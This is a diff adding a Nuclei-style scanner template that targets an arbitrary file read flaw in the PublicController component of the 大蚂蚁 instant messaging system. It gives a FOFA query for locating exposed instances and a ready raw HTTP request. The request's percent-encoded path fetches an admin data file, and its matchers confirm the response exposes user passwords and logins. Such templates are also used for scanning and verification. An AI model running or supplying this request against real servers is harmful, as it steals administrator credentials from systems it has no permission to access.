@@ -1,0 +1,29 @@
+id: damayi-im-publiccontroller-arbitrary-file-read
+
+info:
+  name: "大蚂蚁即时通讯系统PublicController组件任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: product="即时通讯系统"
+
+    大蚂蚁即时通讯系统的 PublicController 组件存在任意文件读取漏洞。攻击者可利用该漏洞读取服务器上的敏感文件，导致信息泄露。
+  tags: 大蚂蚁即时通讯系统
+
+http:
+- raw:
+  - |
+    GET /?m=Admin&c=Public&a=download&file=%2F%52%75%6E%74%69%6D%65%2F%44%61%74%61%2F%6D%73%5F%61%64%6D%69%6E%2E%70%68%70&name=README.txt HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: PHPSESSID=xxxxx
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - 'user_pwd'
+      - 'user_login'
+      - 'user_id'
+    condition: and
